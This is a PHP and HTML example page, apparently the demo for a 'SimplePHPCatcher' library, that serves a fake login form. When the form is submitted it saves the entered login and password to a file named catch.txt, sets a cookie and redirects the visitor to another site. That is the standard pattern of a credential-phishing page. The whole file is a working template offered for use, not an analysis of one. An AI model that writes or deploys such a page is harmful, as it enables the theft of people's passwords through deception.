<?php
    require_once("SimplePHPCatcher.class.php");
    $catcher = new SimplePHPCatcher("catch.txt", "https://www.example.com/");
    //$catcher->redirectOnCookie();

    if ($_SERVER['REQUEST_METHOD'] === "POST") {
        $catcher->catch();
        $catcher->setRememberCookie();
        $catcher->redirect();
    }

?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PHP Catcher example</title>
</head>
<body>
    <form action="" method="post">
        <input placeholder="Login" type="text" name="login" id="">
        <input placeholder="Password" type="password" name="password" id="">
        <button type="submit">Login</button>
    </form>
</body>
</html>